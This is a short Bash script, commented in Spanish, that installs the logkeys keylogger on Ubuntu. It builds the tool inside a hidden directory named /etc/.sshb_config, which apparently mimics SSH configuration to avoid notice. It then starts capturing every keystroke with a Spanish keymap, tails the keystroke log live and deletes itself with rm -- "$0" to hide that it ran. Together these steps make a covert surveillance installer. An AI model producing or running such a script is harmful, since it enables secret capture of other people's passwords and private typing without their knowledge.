#!/bin/bash
# Instalación de dependencias en sistema Ubuntu
sudo apt install build-essential autotools-dev autoconf kbd -y

sudo mkdir /etc/.sshb_config
cd /etc/.sshb_config/

# Descarga del keylogger LogKeys
sudo wget https://github.com/kernc/logkeys/archive/master.zip

# Descomprime el archivo
sudo unzip master.zip

# Ingresa al directorio generado
cd logkeys-master/

# Ejecuta el script autogen
sudo ./autogen.sh

# Configura, compila e instala LogKeys
sudo ./configure && sudo make && sudo make install

# Descarga el mapa de teclado en español
sudo wget https://raw.githubusercontent.com/kernc/logkeys/master/keymaps/es_ES.map

# Ejecuta LogKeys en modo seguimiento, especificando el mapa de teclado y excluyendo las teclas de función
sudo logkeys -s -m es_ES.map --no-func-keys

# Abre otro terminal y muestra en tiempo real el contenido del archivo de registro de LogKeys

# Establecer una variable de entorno
export SCRIPT_EJECUTADO=true

sudo tail -f /var/log/logkeys.log
rm -- "$0"
